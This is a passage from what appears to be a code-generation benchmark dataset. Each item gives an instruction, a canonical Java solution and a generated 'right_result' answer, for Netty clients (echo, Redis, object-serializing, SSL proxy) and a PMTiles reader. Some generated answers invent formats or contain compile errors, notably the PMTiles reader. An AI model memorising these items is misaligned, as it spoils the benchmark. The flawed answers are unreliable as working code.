writeBuffer.rewind();\n        \n        ByteBuf buf = Unpooled.copiedBuffer(writeBuffer);\n        channel.writeAndFlush(buf);\n        writeBuffer.clear();\n    }\n\n    public void startConsoleInput() throws IOException {\n        try (BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in))) {\n            String userInput;\n            while ((userInput = stdIn.readLine()) != null) {\n                sendMessage(userInput);\n            }\n        } catch (UnknownHostException e) {\n            System.err.println(\"\u4e0d\u660e\u4e3b\u673a\uff0c\u4e3b\u673a\u540d\u4e3a\uff1a \" + hostName);\n            System.exit(1);\n        } catch (IOException e) {\n            System.err.println(\"\u4e0d\u80fd\u4ece\u4e3b\u673a\u4e2d\u83b7\u53d6I/O\uff0c\u4e3b\u673a\u540d\u4e3a\uff1a\" + hostName);\n            System.exit(1);\n        }\n    }\n\n    public void shutdown() {\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.string.StringEncoder;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class EchoClient {\n    private final String hostName;\n    private final int portNumber;\n    private EventLoopGroup group;\n    private Channel channel;\n\n    public EchoClient(String hostName, int portNumber) {\n        this.hostName = hostName;\n        this.portNumber = portNumber;\n    }\n\n    public void connect() throws Exception {\n        group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ChannelPipeline pipeline = ch.pipeline();\n                            pipeline.addLast(new StringEncoder());\n                        }\n                    });\n\n            channel = bootstrap.connect(hostName, portNumber).sync().channel();\n        } catch (Exception e) {\n            shutdown();\n            throw e;\n        }\n    }\n\n    public void sendMessage(String message) {\n        if (channel != null && channel.isActive()) {\n            ByteBuf buffer = Unpooled.copiedBuffer(message.getBytes());\n            channel.writeAndFlush(buffer);\n        }\n    }\n\n    public void startConsoleInput() {\n        BufferedReader consoleReader = new BufferedReader(new InputStreamReader(System.in));\n        while (true) {\n            try {\n                String line = consoleReader.readLine();\n                if (line == null || \"exit\".equalsIgnoreCase(line)) {\n                    break;\n                }\n                sendMessage(line);\n            } catch (IOException e) {\n                System.err.println(\"Error reading from console: \" + e.getMessage());\n                break;\n            }\n        }\n    }\n\n    public void shutdown() {\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n        if (channel != null) {\n            channel.close();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        EchoClient client = new EchoClient(\"127.0.0.1\", 8080);\n        client.connect();\n        client.startConsoleInput();\n        client.shutdown();\n    }\n}\n```"
  },
  {
    "Task_id": 13,
    "Instruction": "Task Description: Implement a Java class that reads and processes PMTiles archives, providing access to individual tiles and their metadata using Java NIO's FileChannel for efficient file operations.\n\nClass Description: ReadablePmtiles is a concrete implementation of the ReadableTileArchive interface that enables reading and navigating through a PMTiles archive format. It uses FileChannel for efficient random access to file contents and handles compressed directory structures within the archive.\n\nAttributes:\n- channel: [SeekableByteChannel] - The underlying byte channel for reading the PMTiles file\n- header: [Pmtiles.Header] - The parsed header information from the PMTiles archive\n\nMethods:\n- newReadFromFile: [static](Path path) -> [ReadableTileArchive] - Static factory method that creates a new instance by opening a file channel to the specified path\n- getTile: [int x, int y, int z] -> [byte[]] - Retrieves the tile data at the specified coordinates (x,y,z) or returns null if not found\n- close: [] -> [void] - Closes the underlying file channel and releases system resources\n- getAllTiles: [] -> [CloseableIterator<Tile>] - Returns an iterator over all tiles in the archive\n- getBytes: [private](long start, int length) -> [byte[]] - Internal method to read bytes from the channel at specified position\n- readDir: [private](long offset, int length) -> [List<Pmtiles.Entry>] - Reads and parses a directory from the archive\n- getTiles: [private](List<Pmtiles.Entry> dir) -> [Stream<Tile>] - Converts directory entries into a stream of tiles",
    "Canonical_solution": "import com.onthegomap.planetiler.archive.ReadableTileArchive;\nimport com.onthegomap.planetiler.archive.Tile;\nimport com.onthegomap.planetiler.archive.TileArchiveMetadata;\nimport com.onthegomap.planetiler.archive.TileCompression;\nimport com.onthegomap.planetiler.geo.TileCoord;\nimport com.onthegomap.planetiler.util.CloseableIterator;\nimport com.onthegomap.planetiler.util.Gzip;\nimport java.io.IOException;\nimport java.io.UncheckedIOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.SeekableByteChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.LinkedHashMap;\nimport java.util.List;\nimport java.util.stream.IntStream;\nimport java.util.stream.Stream;\nimport org.locationtech.jts.geom.Coordinate;\n\npublic class ReadablePmtiles implements ReadableTileArchive {\n  private final SeekableByteChannel channel;\n  private final Pmtiles.Header header;\n\n  public ReadablePmtiles(SeekableByteChannel channel) throws IOException {\n    this.channel = channel;\n    this.header = Pmtiles.Header.fromBytes(getBytes(0, Pmtiles.HEADER_LEN));\n  }\n\n  public static ReadableTileArchive newReadFromFile(Path path) throws IOException {\n    return new ReadablePmtiles(FileChannel.open(path, StandardOpenOption.READ));\n  }\n\n  private synchronized byte[] getBytes(long start, int length) throws IOException {\n    channel.position(start);\n    var buf = ByteBuffer.allocate(length);\n    channel.read(buf);\n    return buf.array();\n  }\n\n  @Override\n  @SuppressWarnings(\"java:S1168\")\n  public byte[] getTile(int x, int y, int z) {\n    try {\n      var tileId = TileCoord.ofXYZ(x, y, z).hilbertEncoded();\n      long dirOffset = header.rootDirOffset();\n      int dirLength = (int) header.rootDirLength();\n\n      for (int depth = 0; depth <= 3; depth++) {\n        byte[] dirBytes = getBytes(dirOffset, dirLength);\n        if (header.internalCompression() == Pmtiles.Compression.GZIP) {\n          dirBytes = Gzip.gunzip(dirBytes);\n        }\n\n        var dir = Pmtiles.directoryFromBytes(dirBytes);\n        var entry = findTile(dir, tileId);\n        if (entry != null) {\n          if (entry.runLength() > 0) {\n            return getBytes(header.tileDataOffset() + entry.offset(), entry.length());\n          } else {\n            dirOffset = header.leafDirectoriesOffset() + entry.offset();\n            dirLength = entry.length();\n          }\n        } else {\n          return null;\n        }\n      }\n    } catch (IOException e) {\n      throw new IllegalStateException(\"Could not get tile\", e);\n    }\n    return null;\n  }\n\n  @Override\n  public void close() throws IOException {\n    channel.close();\n  }\n\n  private List<Pmtiles.Entry> readDir(long offset, int length) {\n    try {\n      var buf = getBytes(offset, length);\n      if (header.internalCompression() == Pmtiles.Compression.GZIP) {\n        buf = Gzip.gunzip(buf);\n      }\n      return Pmtiles.directoryFromBytes(buf);\n    } catch (IOException e) {\n      throw new UncheckedIOException(e);\n    }\n  }\n\n  @Override\n  public CloseableIterator<Tile> getAllTiles() {\n    List<Pmtiles.Entry> rootDir = readDir(header.rootDirOffset(), (int) header.rootDirLength());\n    return CloseableIterator.of(getTiles(rootDir));\n  }\n\n  private Stream<Tile> getTiles(List<Pmtiles.Entry> dir) {\n    return dir.stream().mapMulti((entry, next) -> {\n      try {\n        if (entry.runLength == 0) {\n          getTiles(readDir(header.leafDirectoriesOffset() + entry.offset(), entry.length())).forEach(next);\n        } else {\n          var data = getBytes(header.tileDataOffset() + entry.offset(), entry.length());\n          for (int i = 0; i < entry.runLength(); i++) {\n            next.accept(new Tile(TileCoord.hilbertDecode((int) (entry.tileId() + i)), data));\n          }\n        }\n      } catch (IOException e) {\n        throw new IllegalStateException(\"Failed to iterate through pmtiles archive \", e);\n      }\n    });\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "```java\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.NoSuchElementException;\nimport java.util.stream.Stream;\nimport java.util.zip.Inflater;\n\npublic class ReadablePmtiles implements ReadableTileArchive {\n    private final FileChannel channel;\n    private final Header header;\n\n    public static ReadableTileArchive newReadFromFile(Path path) throws IOException {\n        return new ReadablePmtiles(path);\n    }\n\n    private ReadablePmtiles(Path path) throws IOException {\n        this.channel = FileChannel.open(path, StandardOpenOption.READ);\n        this.header = readHeader();\n    }\n\n    @Override\n    public byte[] getTile(int x, int y, int z) throws IOException {\n        long indexOffset = header.index_offset;\n        long indexLength = header.index_length;\n\n        List<Entry> dir = readDir(indexOffset, (int) indexLength);\n        for (Entry entry : dir) {\n            if (entry.x == x && entry.y == y && entry.z == z) {\n                return getBytes(entry.offset, entry.length);\n            }\n        }\n        return null;\n    }\n\n    @Override\n    public void close() throws IOException {\n        channel.close();\n    }\n\n    @Override\n    public CloseableIterator<Tile> getAllTiles() throws IOException {\n        long indexOffset = header.index_offset;\n        long indexLength = header.index_length;\n\n        List<Entry> dir = readDir(indexOffset, (int) indexLength);\n        Stream<Tile> tiles = getTiles(dir);\n        return new TileIterator(tiles.iterator());\n    }\n\n    private byte[] getBytes(long start, int length) throws IOException {\n        ByteBuffer buffer = ByteBuffer.allocate(length);\n        channel.position(start);\n        int bytesRead = 0;\n        while (bytesRead < length) {\n            int result = channel.read(buffer);\n            if (result == -1) break;\n            bytesRead += result;\n        }\n        buffer.flip();\n        byte[] data = new byte[length];\n        buffer.get(data);\n        return data;\n    }\n\n    private List<Entry> readDir(long offset, int length) throws IOException {\n        byte[] compressedData = getBytes(offset, length);\n        Inflater inflater = new Inflater();\n        inflater.setInput(compressedData);\n        byte[] decompressed = new byte[1024];\n        int totalLength = 0;\n        while (!inflater.finished()) {\n            int inflateResult = inflater.inflate(decompressed, totalLength, decompressed.length - totalLength);\n            if (inflateResult == 0) {\n                break;\n            }\n            totalLength += inflateResult;\n        }\n        inflater.end();\n        byte[] dirBytes = new byte[totalLength];\n        System.arraycopy(decompressed, 0, dirBytes, 0, totalLength);\n\n        List<Entry> entries = new ArrayList<>();\n        ByteBuffer buffer = ByteBuffer.wrap(dirBytes);\n        while (buffer.remaining() > 0) {\n            int keyLength = buffer.getInt();\n            byte[] key = new byte[keyLength];\n            buffer.get(key);\n            String keyStr = new String(key);\n            int valueLength = buffer.getInt();\n            byte[] value = new byte[valueLength];\n            buffer.get(value);\n            if (\"tile\".equals(keyStr)) {\n                Entry entry = Entry.parseFrom(value);\n                entries.add(entry);\n            }\n        }\n        return entries;\n    }\n\n    private Stream<Tile> getTiles(List<Entry> dir) {\n        return dir.stream().map(e -> new Tile(e.x, e.y, e.z, getBytes(e.offset, e.length)));\n    }\n\n    private Header readHeader() throws IOException {\n        byte[] headerBytes = getBytes(0, 8);\n        ByteBuffer buffer = ByteBuffer.wrap(headerBytes);\n        int magic = buffer.getInt();\n        if (magic != 0x504D5431) { // \"PMT1\"\n            throw new IOException(\"Invalid PMTiles file\");\n        }\n        int version = buffer.getInt();\n        if (version != 1) {\n            throw new IOException(\"Unsupported PMTiles version: \" + version);\n        }\n        long indexOffset = buffer.getLong();\n        long indexLength = buffer.getLong();\n        return new Header(version, indexOffset, indexLength);\n    }\n\n    private static class Header {\n        final int version;\n        final long index_offset;\n        final long index_length;\n\n        Header(int version, long index_offset, long index_length) {\n            this.version = version;\n            this.index_offset = index_offset;\n            this.index_length = index_length;\n        }\n    }\n\n    private static class Entry {\n        int x;\n        int y;\n        int z;\n        long offset;\n        int length;\n\n        static Entry parseFrom(byte[] bytes) {\n            ByteBuffer buffer = ByteBuffer.wrap(bytes);\n            Entry entry = new Entry();\n            entry.x = buffer.getInt();\n            entry.y = buffer.getInt();\n            entry.z = buffer.getInt();\n            entry.offset = buffer.getLong();\n            entry.length = buffer.getInt();\n            return entry;\n        }\n    }\n\n    private static class Tile {\n        final int x;\n        final int y;\n        final int z;\n        final byte[] data;\n\n        Tile(int x, int y, int z, byte[] data) {\n            this.x = x;\n            this.y = y;\n            this.z = z;\n            this.data = data;\n        }\n    }\n\n    private class TileIterator implements CloseableIterator<Tile> {\n        private final java.util.Iterator<Tile> iterator;\n\n        TileIterator(java.util.Iterator<Tile> iterator) {\n            this.iterator = iterator;\n        }\n\n        @Override\n        public boolean hasNext() {\n            return iterator.hasNext();\n        }\n\n        @Override\n        public Tile next() {\n            return iterator.next();\n        }\n\n        @Override\n        public void close() throws IOException {\n            ReadablePmtiles.this.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 130,
    "Instruction": "Task Description: Create a Java class that implements a Redis client using Netty framework for TCP communication, capable of sending Redis commands and receiving responses.\n\nClass Description: The RedisClient class establishes a non-blocking TCP connection to a Redis server using Netty's NIO framework. It handles command input from the user, sends commands to the Redis server, and manages connection lifecycle including graceful shutdown.\n\nAttributes:\n- HOST: [String] - The Redis server host address (default: \"127.0.0.1\")\n- PORT: [int] - The Redis server port number (default: 6379)\n- group: [EventLoopGroup] - Manages client-side I/O threads\n- channel: [Channel] - The active network channel for communication\n- lastWriteFuture: [ChannelFuture] - Tracks the last write operation to the server\n\nMethods:\n- start(): [void] - Initializes the Netty client, establishes connection to Redis server, and starts command input loop\n- stop(): [void] - Closes the connection and shuts down the client gracefully\n- initChannel(SocketChannel ch): [void] - Configures the channel pipeline with Redis codecs and handlers (internal method)",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.redis.RedisArrayAggregator;\nimport io.netty.handler.codec.redis.RedisBulkStringAggregator;\nimport io.netty.handler.codec.redis.RedisDecoder;\nimport io.netty.handler.codec.redis.RedisEncoder;\nimport io.netty.util.concurrent.GenericFutureListener;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class RedisClient {\n    private static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    private static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"6379\"));\n\n    private EventLoopGroup group;\n    private Channel channel;\n    private ChannelFuture lastWriteFuture;\n\n    public void start() throws Exception {\n        group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new RedisDecoder());\n                     p.addLast(new RedisBulkStringAggregator());\n                     p.addLast(new RedisArrayAggregator());\n                     p.addLast(new RedisEncoder());\n                     p.addLast(new RedisClientHandler());\n                 }\n             });\n\n            channel = b.connect(HOST, PORT).sync().channel();\n\n            System.out.println(\"Enter Redis commands (quit to end)\");\n            BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n            for (;;) {\n                final String input = in.readLine();\n                final String line = input != null ? input.trim() : null;\n                if (line == null || \"quit\".equalsIgnoreCase(line)) {\n                    channel.close().sync();\n                    break;\n                } else if (line.isEmpty()) {\n                    continue;\n                }\n                lastWriteFuture = channel.writeAndFlush(line);\n                lastWriteFuture.addListener(new GenericFutureListener<ChannelFuture>() {\n                    @Override\n                    public void operationComplete(ChannelFuture future) throws Exception {\n                        if (!future.isSuccess()) {\n                            System.err.print(\"write failed: \");\n                            future.cause().printStackTrace(System.err);\n                        }\n                    }\n                });\n            }\n\n            if (lastWriteFuture != null) {\n                lastWriteFuture.sync();\n            }\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    public void stop() throws InterruptedException {\n        if (channel != null) {\n            channel.close().sync();\n        }\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.redis.RedisDecoder;\nimport io.netty.handler.codec.redis.RedisEncoder;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class RedisClient {\n    private static final String HOST = \"127.0.0.1\";\n    private static final int PORT = 6379;\n    private final EventLoopGroup group = new NioEventLoopGroup();\n    private volatile Channel channel;\n    private volatile ChannelFuture lastWriteFuture;\n\n    public void start() throws Exception {\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(new RedisEncoder());\n                        pipeline.addLast(new RedisDecoder());\n                        pipeline.addLast(new SimpleChannelInboundHandler<RedisMessage>() {\n                            @Override\n                            protected void channelRead0(ChannelHandlerContext ctx, RedisMessage msg) {\n                                System.out.println(\"Received: \" + msg);\n                            }\n                        });\n                    }\n                });\n\n        ChannelFuture future = bootstrap.connect(HOST, PORT).sync();\n        channel = future.channel();\n\n        BufferedReader console = new BufferedReader(new InputStreamReader(System.in));\n        String line;\n        while ((line = console.readLine()) != null) {\n            if (line.equals(\"exit\")) {\n                break;\n            }\n            sendCommand(line);\n        }\n\n        stop();\n    }\n\n    public void stop() {\n        if (lastWriteFuture != null) {\n            try {\n                lastWriteFuture.sync();\n            } catch (InterruptedException ignored) {\n            }\n        }\n        if (channel != null) {\n            channel.close();\n        }\n        group.shutdownGracefully();\n    }\n\n    private void sendCommand(String command) {\n        ByteBuf buffer = Unpooled.buffer();\n        for (byte b : (\"*\" + command.split(\" \").length + \"\\r\\n\").getBytes()) {\n            buffer.writeByte(b);\n        }\n        for (String token : command.split(\" \")) {\n            for (byte b : (\"\\$\" + token.length() + \"\\r\\n\" + token + \"\\r\\n\").getBytes()) {\n                buffer.writeByte(b);\n            }\n        }\n        lastWriteFuture = channel.writeAndFlush(buffer);\n    }\n\n    public static void main(String[] args) throws Exception {\n        RedisClient client = new RedisClient();\n        client.start();\n    }\n}\n```"
  },
  {
    "Task_id": 131,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to send serialized Java objects to a remote server.\n\nClass Description: The JacksonClient class establishes a TCP connection to a specified host and port using Netty's non-blocking I/O. It sends a JacksonBean object containing sample data (including lists and maps) to the server and handles connection lifecycle properly.\n\nAttributes:\nhost: String - The hostname or IP address of the remote server\nport: int - The port number of the remote server\n\nMethods:\nconstructor: JacksonClient(String host, int port) -> void - Initializes the client with target server address\nrun: run() -> void - Establishes connection, sends sample data, and manages connection lifecycle. Throws Exception if connection fails",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\npublic class JacksonClient {\n\n    private final String host;\n    private final int port;\n\n    public JacksonClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap()\n                    .group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new JacksonClientInitializer());\n            \n            Channel channel = bootstrap.connect(host, port).sync().channel();\n\n            JacksonBean user = new JacksonBean();\n            user.setAge(27);\n            user.setName(\"waylau\");\n            List<String> sons = new ArrayList<String>();\n            for (int i = 0; i < 10; i++) {\n                sons.add(\"Lucy\"+i);\n                sons.add(\"Lily\"+i);\n            }\n\n            user.setSons(sons);\n            Map<String, String> addrs = new HashMap<String, String>();\n            for (int i = 0; i < 10; i++) {\n                addrs.put(\"001\"+i, \"18998366112\");\n                addrs.put(\"002\"+i, \"15014965012\");\n            }\n\n            user.setAddrs(addrs);\n            channel.write(user);\n            channel.flush();\n\n            channel.closeFuture().sync();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.serialization.ClassResolvers;\nimport io.netty.handler.codec.serialization.ObjectDecoder;\nimport io.netty.handler.codec.serialization.ObjectEncoder;\n\nimport java.io.Serializable;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\npublic class JacksonClient {\n\n    private final String host;\n    private final int port;\n\n    public JacksonClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                    .channel(NioSocketChannel.class)\n                    .option(ChannelOption.SO_KEEPALIVE, true)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ch.pipeline().addLast(\n                                    new ObjectEncoder(),\n                                    new ObjectDecoder(ClassResolvers.cacheDisabled(null)));\n                        }\n                    });\n\n            ChannelFuture future = bootstrap.connect(host, port).sync();\n            Channel channel = future.channel();\n\n            JacksonBean bean = new JacksonBean();\n            bean.setId(1);\n            bean.setName(\"Test Bean\");\n            List<String> list = new ArrayList<>();\n            list.add(\"item1\");\n            list.add(\"item2\");\n            bean.setList(list);\n\n            Map<String, Integer> map = new HashMap<>();\n            map.put(\"key1\", 100);\n            map.put(\"key2\", 200);\n            bean.setMap(map);\n\n            channel.writeAndFlush(bean);\n            channel.closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    public static class JacksonBean implements Serializable {\n        private static final long serialVersionUID = 1L;\n        private int id;\n        private String name;\n        private List<String> list;\n        private Map<String, Integer> map;\n\n        public int getId() {\n            return id;\n        }\n\n        public void setId(int id) {\n            this.id = id;\n        }\n\n        public String getName() {\n            return name;\n        }\n\n        public void setName(String name) {\n            this.name = name;\n        }\n\n        public List<String> getList() {\n            return list;\n        }\n\n        public void setList(List<String> list) {\n            this.list = list;\n        }\n\n        public Map<String, Integer> getMap() {\n            return map;\n        }\n\n        public void setMap(Map<String, Integer> map) {\n            this.map = map;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 132,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to connect to a proxy server, handle SSL encryption if enabled, manage connection lifecycle, and support reconnection with exponential backoff.\n\nClass Description: ProxyClientContainer is a Netty-based TCP client container that establishes and maintains a connection to a proxy server. It handles SSL encryption when configured, manages connection retries with exponential backoff, and provides channel management for proxy communication.\n\nAttributes:\n- logger: [Logger] - SLF4J logger instance for logging events\n- workerGroup: [NioEventLoopGroup] - Netty event loop group for handling I/O operations\n- bootstrap: [Bootstrap] - Primary bootstrap for proxy server connections\n- realServerBootstrap: [Bootstrap] - Bootstrap for real server connections\n- config: [Config] - Configuration instance for client settings\n- sslContext: [SSLContext] - SSL context for secure connections (nullable)\n- sleepTimeMill: [long] - Current sleep duration for reconnection attempts\n\nMethods:\n- ProxyClientContainer() -> [void] - Constructor that initializes worker group, bootstraps, and configures channel pipelines\n- start() -> [void] - Starts the client by initiating connection to proxy server\n- createSslHandler(SSLContext sslContext) -> [ChannelHandler] - Creates SSL handler for secure connections\n- connectProxyServer() -> [void] - Connects to proxy server with retry logic on failure\n- stop() -> [void] - Shuts down the client gracefully\n- channelInactive(ChannelHandlerContext ctx) -> [void] - Handles channel inactive events by triggering reconnection\n- reconnectWait() -> [void] - Implements exponential backoff for reconnection attempts",
    "Canonical_solution": "import javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLEngine;\nimport org.fengfei.lanproxy.client.handlers.ClientChannelHandler;\nimport org.fengfei.lanproxy.client.handlers.RealServerChannelHandler;\nimport org.fengfei.lanproxy.common.Config;\nimport org.fengfei.lanproxy.protocol.IdleCheckHandler;\nimport org.fengfei.lanproxy.protocol.ProxyMessage;\nimport org.fengfei.lanproxy.protocol.ProxyMessageDecoder;\nimport org.fengfei.lanproxy.protocol.ProxyMessageEncoder;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslHandler;\n\npublic class ProxyClientContainer {\n\n    private static Logger logger = LoggerFactory.getLogger(ProxyClientContainer.class);\n\n    private NioEventLoopGroup workerGroup;\n    private Bootstrap bootstrap;\n    private Bootstrap realServerBootstrap;\n    private Config config = Config.getInstance();\n    private SSLContext sslContext;\n    private long sleepTimeMill = 1000;\n\n    public ProxyClientContainer() {\n        workerGroup = new NioEventLoopGroup();\n        realServerBootstrap = new Bootstrap();\n        realServerBootstrap.group(workerGroup);\n        realServerBootstrap.channel(NioSocketChannel.class);\n        realServerBootstrap.handler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            public void initChannel(SocketChannel ch) throws Exception {\n                ch.pipeline().addLast(new RealServerChannelHandler());\n            }\n        });\n\n        bootstrap = new Bootstrap();\n        bootstrap.group(workerGroup);\n        bootstrap.channel(NioSocketChannel.class);\n        bootstrap.handler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            public void initChannel(SocketChannel ch) throws Exception {\n                if (Config.getInstance().getBooleanValue(\"ssl.enable\", false)) {\n                    if (sslContext == null) {\n                        sslContext = SslContextCreator.createSSLContext();\n                    }\n                    ch.pipeline().addLast(createSslHandler(sslContext));\n                }\n                ch.pipeline().addLast(new ProxyMessageDecoder(MAX_FRAME_LENGTH, LENGTH_FIELD_OFFSET, LENGTH_FIELD_LENGTH, LENGTH_ADJUSTMENT, INITIAL_BYTES_TO_STRIP));\n                ch.pipeline().addLast(new ProxyMessageEncoder());\n                ch.pipeline().addLast(new IdleCheckHandler(IdleCheckHandler.READ_IDLE_TIME, IdleCheckHandler.WRITE_IDLE_TIME - 10, 0));\n                ch.pipeline().addLast(new ClientChannelHandler(realServerBootstrap, bootstrap, ProxyClientContainer.this));\n            }\n        });\n    }\n\n    public void start() {\n        connectProxyServer();\n    }\n\n    private ChannelHandler createSslHandler(SSLContext sslContext) {\n        SSLEngine sslEngine = sslContext.createSSLEngine();\n        sslEngine.setUseClientMode(true);\n        return new SslHandler(sslEngine);\n    }\n\n    private void connectProxyServer() {\n        bootstrap.connect(config.getStringValue(\"server.host\"), config.getIntValue(\"server.port\")).addListener(new ChannelFutureListener() {\n            @Override\n            public void operationComplete(ChannelFuture future) throws Exception {\n                if (future.isSuccess()) {\n                    ProxyMessage proxyMessage = new ProxyMessage();\n                    proxyMessage.setType(ProxyMessage.C_TYPE_AUTH);\n                    proxyMessage.setUri(config.getStringValue(\"client.key\"));\n                    future.channel().writeAndFlush(proxyMessage);\n                    sleepTimeMill = 1000;\n                    logger.info(\"connect proxy server success, {}\", future.channel());\n                } else {\n                    logger.warn(\"connect proxy server failed\", future.cause());\n                    reconnectWait();\n                    connectProxyServer();\n                }\n            }\n        });\n    }\n\n    public void stop() {\n        workerGroup.shutdownGracefully();\n    }\n\n    public void channelInactive(ChannelHandlerContext ctx) {\n        reconnectWait();\n        connectProxyServer();\n    }\n\n    private void reconnectWait() {\n        try {\n            if (sleepTimeMill > 60000) {\n                sleepTimeMill = 1000;\n            }\n            synchronized (this) {\n                sleepTimeMill = sleepTimeMill * 2;\n                wait(sleepTimeMill);\n            }\n        } catch (InterruptedException e) {\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslHandler;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport javax.net.ssl.SSLContext;\nimport java.util.concurrent.TimeUnit;\n\npublic class ProxyClientContainer {\n    private final Logger logger = LoggerFactory.getLogger(ProxyClientContainer.class);\n    private final NioEventLoopGroup workerGroup = new NioEventLoopGroup();\n    private final Bootstrap bootstrap = new Bootstrap();\n    private final Config config;\n    private SSLContext sslContext;\n    private long sleepTimeMill = 1000;\n    private Channel channel;\n\n    public ProxyClientContainer() {\n        this.config = Config.getInstance(); // Assume a singleton or static instance\n        configureBootstrap();\n    }\n\n    private void configureBootstrap() {\n        bootstrap.group(workerGroup)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .handler(new ChannelInitializer<>() {\n                    @Override\n                    protected void initChannel(Channel ch) throws Exception {\n                        